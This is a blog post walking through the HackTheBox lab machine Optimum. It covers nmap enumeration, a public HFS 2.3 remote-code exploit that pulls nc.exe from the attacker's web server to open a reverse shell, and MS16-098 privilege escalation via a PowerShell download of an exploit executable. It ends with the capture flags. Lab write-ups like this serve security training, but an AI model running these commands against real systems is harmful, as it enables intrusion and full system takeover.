---
layout: post
title: HackTheBox Optimum
date: 2017-03-18
tags: [HackTheBox, Windows]
---

# Machine Synopsis

Optimum is a beginner-level machine which mainly focuses on enumeration of services with known exploits. Both exploits are easy to obtain and have associated Metasploit modules, making this machine fairly simple to complete. ([Source](https://www.hackthebox.com/machines/optimum))

# Enumeration

```bash
┌──(root💀Shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.8              
Starting Nmap 7.91 ( https://nmap.org )
Nmap scan report for 10.10.10.8
Host is up (0.17s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2012 (91%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 7 Professional (87%), Microsoft Windows 8.1 Update 1 (86%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   165.43 ms 10.10.14.1
2   165.50 ms 10.10.10.8

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.69 seconds
```
![Website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Optimum/Website.png?raw=true)

The server is running `HttpFileServer 2.3 Exploit` and it is vulnerable to this [RCE](https://www.exploit-db.com/exploits/39161) exploit.  From the instructions of the code, it says that `You need to be using a web server hosting netcat (http://<attackers_ip>:80/nc.exe).`. 

```bash
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# locate nc.exe
/usr/lib/mono/4.5/cert-sync.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/sqlninja/apps/nc.exe
/usr/share/windows-resources/binaries/nc.exe

┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# cp /usr/share/windows-resources/binaries/nc.exe .

┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```
Now we can start a netcat listener and run the exploit using `python <exploit>.py <Target IP address> <Target Port Number>`
```bash
┌──(root💀Shiro)-[/home/shiro]
└─# nc -nvlp 443                                                        
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# python rce.py 10.10.10.8 80 
```
```cmd
C:\Users\kostas\Desktop>type user.txt.txt
d0c39409d7b994a9a1389ebf38ef5f73

C:\Users\kostas\Desktop>systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          22/5/2021, 6:51:15 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.486 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.939 MB
Virtual Memory: In Use:    564 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.8
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```
# Privilege Escalation

With the `systeminfo`, we can use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) to find exploits.

```bash
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# ./windows-exploit-suggester.py --database 2021-05-16-mssb.xlsx --systeminfo systeminfo.txt
...
[E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]   https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*] 
...
```
After researching around, the vulnerability we are interested in should be ```MS16-098```.
```bash
┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# searchsploit ms16-098                                               
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Microsoft Windows 8.1 (x64) - 'RGNOBJ' Intege | windows_x86-64/local/41020.c
Microsoft Windows 8.1 (x64) - RGNOBJ Integer  | windows_x86-64/local/42435.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(root💀Shiro)-[/home/shiro/HackTheBox/Optimum]
└─# searchsploit -m 41020.c             
```
Viewing the contents of the code shows that there is an executable online that we can use [here](https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe)!

Restart our python server and then download the executable from the victim's machine.

```cmd
C:\Users\kostas\Desktop>powershell wget "http://10.10.14.4/41020.exe" -outfile "exploit.exe"
C:\Users\kostas\Desktop>exploit.exe
...
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.
C:\Users\kostas\Desktop>whoami
nt authority\system
C:\Users\kostas\Desktop>cd C:\Users\Administrator\Desktop
C:\Users\Administrator\Desktop>type root.txt
51ed1b36553c8461f4552c2e92b3eeed
```

